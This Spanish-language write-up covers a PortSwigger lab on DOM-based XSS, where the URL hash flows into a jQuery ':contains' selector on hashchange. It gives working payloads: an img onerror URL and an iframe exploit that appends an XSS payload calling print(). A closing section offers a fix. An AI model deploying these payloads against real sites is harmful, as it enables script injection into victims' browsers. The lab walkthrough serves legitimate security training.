# **🔴 DOM XSS en jQuery - Vulnerabilidad en selector usando `hashchange`**

## **📝 Descripción**  
Esta vulnerabilidad ocurre cuando datos no confiables del **fragmento de la URL (`window.location.hash`)** se insertan directamente en un **selector de jQuery** sin validación. Esto permite a un atacante manipular el fragmento de la URL para inyectar código malicioso y ejecutarlo en el navegador de la víctima.  

- **Source**: `window.location.hash` → El fragmento de la URL después del `#`, que puede ser controlado por un atacante.  
- **Sink**: **Selector de jQuery** → `$('section.blog-list h2:contains(...)')`, donde el valor del hash es insertado directamente sin escape ni validación.  

---

## **🔍 Código Vulnerable**  
```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

---

## **1️⃣ ¿Qué es un selector de jQuery?**  

Un **selector de jQuery** es una expresión que se usa para **buscar y seleccionar elementos HTML** en una página web. Se basa en la sintaxis de **CSS** y se usa con la función `$()` de jQuery.  

### **Ejemplos de selectores comunes en jQuery**  

| Selector | Descripción | Ejemplo |
|----------|------------|---------|
| `$("p")` | Selecciona todos los párrafos `<p>` | `$("p").hide();` |
| `$("#id")` | Selecciona un elemento por su `id` | `$("#miDiv").show();` |
| `$(".clase")` | Selecciona todos los elementos con la clase especificada | `$(".caja").fadeIn();` |
| `$("div > p")` | Selecciona solo los `<p>` que son hijos directos de `<div>` | `$("div > p").css("color", "red");` |
| `$("ul li:first")` | Selecciona el primer `<li>` de una lista | `$("ul li:first").addClass("seleccionado");` |

---

## **2️⃣ Explicación del código vulnerable**  

### **🔹 `window.location.hash`**
- `window.location.hash` obtiene el fragmento de la URL después del `#`.  
- Ejemplo de URL:  
  ```
  https://example.com/page#article-title
  ```
  `window.location.hash` devolvería `#article-title`.

### **🔹 Evento `hashchange`**
- `$(window).on('hashchange', function() {...});`  
- Se ejecuta cada vez que cambia el fragmento de la URL (`#...`).  

### **🔹 Selector jQuery con `:contains(...)`**
- `:contains(...)` es un selector que busca elementos que **contienen** un texto específico.  
- En este caso, el código busca un `<h2>` que contenga el texto del hash de la URL:  
  ```javascript
  $('section.blog-list h2:contains(...)')
  ```
- **Problema**: Se inyecta el contenido del hash sin sanitización, lo que permite insertar código malicioso.

---

## **⚠️ Explotación básica: XSS mediante `hashchange` y `:contains(...)`**  

### **¿Cómo se explota la vulnerabilidad?**  
Un atacante puede modificar la URL para incluir código malicioso en el hash:  
```
https://0a66003303ae8bcc828947a800650044.web-security-academy.net/#<img src=x onerror=alert(1)>
```

### **¿Qué sucede cuando se carga esta URL?**
1. **El hash se extrae de la URL**:  
   ```javascript
   decodeURIComponent(window.location.hash.slice(1))
   ```
   - `#<img src=x onerror=alert(1)>` → Se elimina el `#`:  
     ```html
     <img src=x onerror=alert(1)>
     ```

2. **Se usa como selector en jQuery**:
   ```javascript
   $('section.blog-list h2:contains(<img src=x onerror=alert(1)>)')
   ```
   - **El navegador interpreta el `<img>` como HTML válido** y ejecuta `onerror=alert(1)`.

3. **Resultado**: Aparece un `alert(1)`, lo que confirma la vulnerabilidad.

---

## **🚀 Explotación avanzada con `print()` y el Exploit Server de PortSwigger**  

Para que la víctima ejecute automáticamente el código malicioso al abrir un enlace, se usa un **iframe malicioso** desde el **Exploit Server** de PortSwigger.  

---

### **📌 ¿Qué es el Exploit Server de PortSwigger?**  
PortSwigger (creadores de Burp Suite) ofrece un **Exploit Server**, que permite alojar páginas HTML maliciosas para realizar ataques automatizados.

#### **📌 URL maliciosa generada por el Exploit Server**  
```
https://exploit-0a430085034e8b3f82f5466e014b0093.exploit-server.net/exploit
```

---

### **📌 Código del exploit avanzado**  
```html
<iframe src="https://0a66003303ae8bcc828947a800650044.web-security-academy.net/#" 
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

---

### **📌 Explicación del exploit avanzado**
1. **El usuario visita el exploit alojado en el Exploit Server**.  
2. **El exploit carga la página vulnerable en un `iframe`**:  
   ```html
   <iframe src="https://0a66003303ae8bcc828947a800650044.web-security-academy.net/#">
   ```
   - Un `iframe` es un elemento HTML que carga otra página dentro de la actual.

3. **El atributo `onload` modifica el `src` del `iframe`**:  
   ```html
   onload="this.src+='<img src=x onerror=print()>'"
   ```
   - **Se agrega dinámicamente el payload malicioso** al hash de la URL.  
   - Como resultado, el navegador ejecuta `print()`, abriendo el cuadro de impresión.

4. **¿Por qué `print()` en vez de `alert()`?**  
   - `print()` abre el cuadro de impresión del navegador, lo que:
     - **Bloquea la interacción** de la víctima.  
     - **Distrae** al usuario mientras el ataque ocurre.  

---

## **🔐 Solución para evitar esta vulnerabilidad**  

### **1️⃣ Escapar correctamente el selector jQuery**  
Antes de usar el valor del hash en un selector jQuery, es necesario **sanearlo**.  

#### **Código seguro**:
```javascript
$(window).on('hashchange', function(){
    let hashValue = decodeURIComponent(window.location.hash.slice(1));

    // Escapar caracteres peligrosos
    let sanitizedValue = hashValue.replace(/</g, "&lt;").replace(/>/g, "&gt;");

    let post = $('section.blog-list h2').filter(function(){
        return $(this).text() === sanitizedValue;
    });

    if (post.length) post.get(0).scrollIntoView();
});
```

---

## **🎯 Resumen final**  

- **Código Vulnerable**: Se usa `window.location.hash` sin validación dentro de un selector jQuery (`:contains(...)`).
- **Explotación**: Se manipula la URL para ejecutar código malicioso.
- **Exploit avanzado**: Se usa un **iframe malicioso** en el Exploit Server de PortSwigger para ejecutar código sin que la víctima haga clic.
- **Solución**: **Sanitizar el hash** antes de usarlo en selectores jQuery y evitar el uso de `:contains(...)` con datos dinámicos.
